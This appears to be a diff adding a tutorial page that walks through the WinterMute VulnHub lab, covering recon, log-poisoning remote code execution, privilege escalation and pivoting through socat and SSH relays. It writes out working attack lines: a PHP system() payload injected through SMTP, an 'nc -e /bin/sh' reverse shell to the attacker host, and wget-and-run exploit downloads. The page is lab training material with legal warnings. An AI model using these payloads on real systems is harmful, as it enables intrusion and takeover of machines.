@@ -312,7 +312,342 @@ td:first-child { font-weight: 600; color: var(--heading); }
   <body style="padding-top:64px">
     <script src="navbar.js" defer></script>
 <main>
-    <div id="root"></div>
+    <div id="root"><div style="font-family:-apple-system,'Segoe UI',sans-serif;background:#0a0e14;color:#e2e8f0;padding:32px 20px;max-width:860px;margin:0 auto;line-height:1.6">
+<h1 style="font-size:2rem;font-weight:800;margin:0 0 12px">Pivoting, tunneling &amp; lateral movement</h1>
+<p style="font-size:1.05rem;color:#94a3b8;margin:0 0 28px;max-width:640px">Toggle between the four modes below and watch what actually changes.</p>
+<section id="setup" style="margin-bottom:40px">
+  <h2 style="font-size:1.5rem;font-weight:700;color:#9c6b12;margin:0 0 6px">Lab Setup — Two Networks, Three Machines</h2>
+  <p style="color:#94a3b8;margin:0 0 20px">The network topology IS the lesson. Get the two host-only networks wired correctly and pivoting stops being an abstract diagram.</p>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Before you start</h3>
+    <p style="margin:0 0 12px">WinterMute is a deliberately vulnerable VM released free on VulnHub for legal practice. Running these techniques against anything you don't own or have written permission to test is illegal in most jurisdictions — keep this lab on an isolated, offline virtual network.</p>
+    <p style="margin:0 0 12px;color:#fca5a5"><strong>Warning:</strong> Educational use against your own local WinterMute VMs only.</p>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">What you'll need</h3>
+    <ul style="margin:0 0 12px;padding-left:20px">
+      <li>A computer that can run 2–3 VMs at once — 8GB+ RAM recommended</li>
+      <li>VirtualBox (free) and a Kali VM</li>
+      <li>The WinterMute VMs (free — linked below)</li>
+      <li>Roughly 3–5 hours</li>
+    </ul>
+    <ul style="margin:0 0 12px;padding-left:20px">
+      <li><a href="https://www.virtualbox.org/" style="color:#7dd3fc">VirtualBox — free download</a></li>
+      <li><a href="https://www.vulnhub.com/entry/wintermute-1,239/" style="color:#7dd3fc">WinterMute — official VulnHub entry</a></li>
+    </ul>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Download and verify the archive</h3>
+    <p style="margin:0 0 12px">WinterMute ships as Wintermute-v1.zip (2.4 GB) — both VMs plus the author's setup notes. Verify the hash before importing anything.</p>
+    <p style="margin:0 0 12px;color:#7dd3fc"><strong>Tip:</strong> Works better in VirtualBox than VMware, per the author's notes.</p>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px">
+      <p style="margin:0 0 8px;font-weight:600">Exercise: Verify the archive hash</p>
+      <pre style="margin:0 0 8px;padding:8px;background:#020617;border-radius:4px;overflow-x:auto;white-space:pre-wrap"><code>md5sum Wintermute-v1.zip
+# should match: 4BFABB5021B33C2A4AB7A5DB1F17A9ED
+
+sha1sum Wintermute-v1.zip
+# should match: 643D14EDCADA7EEF08C66DBD4CF89AABFD6097A3</code></pre>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Two host-only networks, two different subnets</h3>
+    <p style="margin:0 0 12px">Network #1 holds Kali and Straylight. Network #2 holds Straylight and Neuromancer — reachable only through Straylight.</p>
+    <ol style="margin:0 0 12px;padding-left:20px">
+      <li>VirtualBox: File → Tools → Network Manager.</li>
+      <li>Create a host-only adapter (vboxnet0). Default DHCP is fine.</li>
+      <li>Create a second one (vboxnet1) on a DIFFERENT subnet — e.g. 192.168.56.0/24 and 192.168.57.0/24.</li>
+    </ol>
+    <p style="margin:0 0 12px;color:#fca5a5"><strong>Warning:</strong> Same subnet on both = Kali reaches Neuromancer directly and the whole exercise collapses without you noticing.</p>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Wiring the three machines</h3>
+    <table style="width:100%;border-collapse:collapse;margin:0 0 12px;font-size:0.9rem">
+      <thead><tr>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Machine</th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Adapter 1</th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Adapter 2</th>
+      </tr></thead>
+      <tbody>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Kali</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Network #1</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">NAT (optional, internet only)</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Straylight</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Network #1</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Network #2 — enabled. This makes it the pivot.</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Neuromancer</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Network #2 only</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Disabled</td>
+      </tr>
+      </tbody>
+    </table>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Verify the topology before touching an exploit</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px">
+      <p style="margin:0 0 8px;font-weight:600">Exercise: Confirm Network #2 is unreachable directly</p>
+      <p style="margin:0 0 8px">If step 4 fails as expected: Kali → Straylight → Neuromancer is correctly isolated. If it succeeds, revisit the adapter settings.</p>
+      <ol style="margin:0 0 8px;padding-left:20px">
+        <li>Start all three machines.</li>
+        <li>Kali: ip a — confirm Network #1 address.</li>
+        <li>ping &lt;straylight_ip&gt; — should succeed.</li>
+        <li>Try reaching the Network #2 range directly from Kali — should FAIL.</li>
+      </ol>
+    </div>
+  </article>
+</section>
+<section id="foothold" style="margin-bottom:40px">
+  <h2 style="font-size:1.5rem;font-weight:700;color:#a3402c;margin:0 0 6px">Getting a Foothold on Straylight</h2>
+  <p style="color:#94a3b8;margin:0 0 20px">Recon, an exposed monitoring tool, a file-read bug, and a mail-log trick that turns into code execution.</p>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Recon</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ nmap -Pn -sT -sV -sC -p- &lt;straylight_ip&gt;</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">25/tcp   open  smtp
+80/tcp   open  http
+3000/tcp open  ppp (ntopng)</pre>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Three ports. 3000 is ntopng — a monitoring tool. Start there.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">ntopng — default creds</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">browser → http://&lt;straylight_ip&gt;:3000</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Login: admin / admin. Flows tab reveals /freeside/ and /turing-bolo/ — paths a directory brute-force would likely miss.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Arbitrary file read</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ curl "http://&lt;straylight_ip&gt;/turing-bolo/bolo.php?bolo=/var/log/mail"</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">&lt;contents of /var/log/mail returned&gt;</pre>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">bolo= is used directly as a filename, .log appended — classic unvalidated path parameter.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">File-read → RCE via mail-log poisoning</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ telnet &lt;straylight_ip&gt; 25</p>
+      <p style="margin:0 0 4px;color:#4ade80">smtp&gt; MAIL FROM:&lt;you@example.com&gt;</p>
+      <p style="margin:0 0 4px;color:#4ade80">smtp&gt; RCPT TO:&lt;?php echo system($_POST['cmd']); ?&gt;</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">PHP now sits inside the mail log, waiting to be interpreted.</p>
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ curl -X POST "http://&lt;straylight_ip&gt;/turing-bolo/bolo.php?bolo=/var/log/mail" --data "cmd=id"</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">uid=33(www-data) gid=33(www-data)</pre>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">RCE confirmed. Log poisoning generalizes: any log that (a) accepts attacker text and (b) gets interpreted elsewhere is a candidate — mail, access, and FTP logs are the classic three.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Reverse shell, then stabilize</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ nc -lvnp 4444</p>
+      <p style="margin:0 0 4px;color:#4ade80">trigger → cmd=nc -e /bin/sh &lt;kali_ip&gt; 4444</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">connect to [kali_ip] from straylight ... shell caught</pre>
+      <p style="margin:0 0 4px;color:#4ade80">straylight$ python3 -c 'import pty;pty.spawn("/bin/bash")'</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Ctrl+Z, then on Kali: stty raw -echo; fg — full tty, tab-complete, safe Ctrl+C.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Privesc — a stale SUID binary</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">straylight$ find / -perm -4000 2&gt;/dev/null</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">...
+-rwsr-xr-x 1 root root  screen-4.5.0</pre>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">A version number on a SUID binary is always worth checking.</p>
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ searchsploit screen 4.5.0</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Host the matching exploit (python3 -m http.server), wget + chmod +x + run on target → root on Straylight. Check /root/ once you land — a note hints at Neuromancer.</p>
+    </div>
+  </article>
+</section>
+<section id="pivot" style="margin-bottom:40px">
+  <h2 style="font-size:1.5rem;font-weight:700;color:#1f5c7a;margin:0 0 6px">Pivoting to Neuromancer &amp; Taking Root</h2>
+  <p style="color:#94a3b8;margin:0 0 20px">The module this whole guide exists for: relay through Straylight to reach a machine Kali can never see directly, exploit it, and relocate your shell onto it.</p>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Discovering the second network</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">straylight# ifconfig</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">eth1: inet 192.168.57.4</pre>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">A second NIC — Network #2. Invisible from Kali, visible from here.</p>
+      <p style="margin:0 0 4px;color:#4ade80">straylight# for i in {1..254}; do (ping -c1 192.168.57.$i | grep "bytes from" &amp;); done</p>
+      <p style="margin:0 0 4px;color:#4ade80">straylight# for p in $(seq 1 65535); do (nc -nvzw1 &lt;neuromancer_ip&gt; $p 2&gt;&amp;1 | grep open &amp;); done</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">nmap likely isn't installed here — netcat loops fill in. Expect a web port, another service, and SSH on a high port.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Building the pivot: a port-forwarding relay</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">straylight# socat TCP-LISTEN:8080,fork,reuseaddr TCP:&lt;neuromancer_ip&gt;:8080 &amp;</p>
+      <p style="margin:0 0 4px;color:#4ade80">straylight# socat TCP-LISTEN:8009,fork,reuseaddr TCP:&lt;neuromancer_ip&gt;:8009 &amp;</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">straylight:8080 now silently forwards to neuromancer:8080. Nothing about the traffic changed — only where it's addressed.</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Same job, tunneled instead of forwarded</h3>
+    <p style="margin:0 0 12px">socat needs installing and running on the pivot host, and encrypts nothing. SSH's own local forwarding does the identical job with nothing but a valid login.</p>
+    <table style="width:100%;border-collapse:collapse;margin:0 0 12px;font-size:0.9rem">
+      <thead><tr>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155"></th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">socat (used above)</th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">SSH local forward (-L)</th>
+      </tr></thead>
+      <tbody>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Encrypts?</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">No</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Yes</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Needs on pivot host</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">socat + a shell to run it from</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Just a valid login</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Command</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">socat TCP-LISTEN:8080,fork,reuseaddr TCP:neuro_ip:8080 &amp;</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">ssh -L 8080:neuro_ip:8080 user@straylight_ip</td>
+      </tr>
+      </tbody>
+    </table>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Exploiting Neuromancer's web app through the relay</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">straylight# socat TCP-LISTEN:4321,fork,reuseaddr TCP:&lt;kali_ip&gt;:4321 &amp;</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Bridges the callback — Neuromancer's shell needs to reach an address IT can see: Straylight's internal IP, not Kali's.</p>
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ &lt;trigger the Struts2 exploit against straylight:8080, callback → straylight_internal_ip:4321&gt;</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Double pivot: one relay carries the exploit in, a second carries the shell back out. Once it lands, your foothold has genuinely relocated — exploitation-based lateral movement (T1210), not credential-based (T1021).</p>
+    </div>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Root on Neuromancer</h3>
+    <div style="margin:0 0 12px;padding:12px;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.85rem">
+      <p style="margin:0 0 4px;color:#4ade80">neuromancer$ uname -a</p>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">No compiler on target — compile locally instead:</p>
+      <p style="margin:0 0 4px;color:#4ade80">kali:~$ gcc -o exploit exploit.c &amp;&amp; python3 -m http.server 4321</p>
+      <p style="margin:0 0 4px;color:#4ade80">neuromancer$ wget http://&lt;relay_ip&gt;:4321/exploit &amp;&amp; chmod +x exploit &amp;&amp; ./exploit</p>
+      <pre style="margin:0 0 8px;color:#94a3b8;white-space:pre-wrap">uid=0(root) gid=0(root)</pre>
+      <p style="margin:0 0 8px;color:#7dd3fc;font-family:-apple-system,sans-serif">Root on Neuromancer. Bonus: its Tomcat config has a password that's encoded, not encrypted — obfuscation isn't security.</p>
+    </div>
+  </article>
+</section>
+<section id="wrapup" style="margin-bottom:40px">
+  <h2 style="font-size:1.5rem;font-weight:700;color:#3d6ea5;margin:0 0 6px">What You Just Practiced</h2>
+  <p style="color:#94a3b8;margin:0 0 20px">The full loop, one more time — and where to go next.</p>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">The pattern that just repeated</h3>
+    <p style="margin:0 0 12px">Enumerate → exploit → escalate → discover a second network → relay through your foothold → exploit and escalate again. A public-facing system trusted by an internal one that isn't directly reachable is one of the most common findings in real internal pentests.</p>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Checking the four concepts landed</h3>
+    <ul style="margin:0 0 12px;padding-left:20px">
+      <li>Port forwarding — the socat relays moving raw traffic Straylight → Neuromancer.</li>
+      <li>Tunneling — the SSH -L equivalent, encrypted, using nothing but a login.</li>
+      <li>Pivoting — treating Straylight as the only route to a network you couldn't otherwise reach.</li>
+      <li>Lateral movement — exploiting Neuromancer through the relay, genuinely relocating your shell (T1210, not T1021).</li>
+    </ul>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Next steps</h3>
+    <p style="margin:0 0 12px">Redo the lab without this guide — the second pass is where it sticks. For something harder, myHouse7 on VulnHub is a multi-subnet variant of the same idea.</p>
+  </article>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">Credits</h3>
+    <p style="margin:0 0 12px">WinterMute was created by creosote, released on VulnHub 5 July 2018, Intermediate difficulty, no buffer-overflow knowledge required — explicitly OSCP-style pivoting practice. All credit for the lab goes to its original author.</p>
+  </article>
+</section>
+<section id="reference" style="margin-bottom:40px">
+  <h2 style="font-size:1.5rem;font-weight:700;color:#5c6c7c;margin:0 0 6px">Port Forwarding &amp; Tunneling Cheat Sheet</h2>
+  <p style="color:#94a3b8;margin:0 0 20px">Click any command above — or below — to see what it does. Plus the SSH forwarding modes WinterMute didn't happen to need.</p>
+  <article style="margin:0 0 24px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1.1rem;font-weight:600;margin:0 0 8px">The three SSH forwarding modes</h3>
+    <table style="width:100%;border-collapse:collapse;margin:0 0 12px;font-size:0.9rem">
+      <thead><tr>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Flag</th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Name</th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Direction</th>
+        <th style="text-align:left;padding:6px 10px;border-bottom:1px solid #334155">Example</th>
+      </tr></thead>
+      <tbody>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">-L</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Local forward</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Your machine → a destination reachable from the far end</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">ssh -L 8080:neuro_ip:80 user@straylight</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">-R</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Remote forward</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Far end → back to something on your machine</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">ssh -R 4444:127.0.0.1:4444 user@straylight</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">-D</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Dynamic forward</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">Whole connection becomes a SOCKS proxy</td>
+        <td style="padding:6px 10px;border-bottom:1px solid #1e293b">ssh -D 1080 user@straylight</td>
+      </tr>
+      </tbody>
+    </table>
+    <p style="margin:0 0 12px;color:#7dd3fc"><strong>Tip:</strong> -R is for when the target can reach your pivot host but you can't add a new inbound listener on it — the same problem the callback relay in Stage 2 solved by hand.</p>
+  </article>
+</section>
+<section id="glossary-reference" style="margin-bottom:40px">
+  <h2 style="font-size:1.5rem;font-weight:700;margin:0 0 6px">Command Reference</h2>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">nmap <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Recon)</span></h3>
+    <p style="margin:0 0 6px">Scans a host for open ports and fingerprints running services.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">-Pn skips the host-alive ping check, -sV grabs version banners, -sC runs default scripts, -p- scans all 65535 ports. Often NOT installed on a machine you've compromised — later stages fall back to nc loops instead.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">socat <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Pivoting)</span></h3>
+    <p style="margin:0 0 6px">Relays raw traffic between two endpoints — the core pivoting workhorse.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">socat TCP-LISTEN:PORT,fork,reuseaddr TCP:DEST:PORT opens a listener on the pivot host and forwards every connection to a destination it can reach but you can't. Moves bytes unmodified — no encryption, unlike an SSH tunnel.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">ssh <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Tunneling)</span></h3>
+    <p style="margin:0 0 6px">Secure shell — and, via -L / -R / -D, a built-in encrypted tunnel.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">-L forwards a local port out to a remote destination, -R forwards a remote port back to your machine, -D turns the connection into a SOCKS proxy. Everything is encrypted, and you only need valid credentials — no separate binary on the target.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">nc <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Utility)</span></h3>
+    <p style="margin:0 0 6px">Netcat — reads and writes raw TCP or UDP connections directly.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">-lvnp opens a verbose listener (catches reverse shells). Also useful as a crude port scanner (nc -nvzw1 host port) when nmap isn't available.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">curl <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Utility)</span></h3>
+    <p style="margin:0 0 6px">Sends an HTTP request from the command line.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">Used to trigger vulnerable endpoints and POST data without a browser — handy once you're working from a shell.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">wget <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Utility)</span></h3>
+    <p style="margin:0 0 6px">Downloads a file from a URL straight to disk.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">Paired with python3 -m http.server: host a file on your attacking machine, wget it on the target. This pattern repeats three times in this lab.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">gcc <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Utility)</span></h3>
+    <p style="margin:0 0 6px">Compiles C source code into a runnable binary.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">If the target has no compiler, compile locally instead and transfer the finished binary — architecture permitting.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">searchsploit <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Recon)</span></h3>
+    <p style="margin:0 0 6px">Searches a local, offline copy of Exploit-DB for matching exploits.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">Once you've fingerprinted an exact software version, searchsploit &lt;name&gt; &lt;version&gt; checks whether a public exploit already exists — often the fastest path from version number to working code.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">telnet <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Utility)</span></h3>
+    <p style="margin:0 0 6px">Opens a raw, unencrypted connection so you can type a protocol by hand.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">Useful for manually speaking a plaintext protocol line-by-line — like typing SMTP commands directly at a mail server.</p>
+  </article>
+  <article style="margin:0 0 16px;padding-left:14px;border-left:2px solid #1e293b">
+    <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px;font-family:monospace">ifconfig <span style="font-weight:400;color:#64748b;font-size:0.8rem">(Recon)</span></h3>
+    <p style="margin:0 0 6px">Lists network interfaces and the addresses assigned to them.</p>
+    <p style="margin:0;color:#94a3b8;font-size:0.9rem">The first command worth running on any new shell — often reveals a second, otherwise-invisible network segment, which is what turns a host into a pivot point.</p>
+  </article>
+</section>
+</div></div>
     <script>
 const h = React.createElement;
 const { useState, useEffect, useRef } = React;
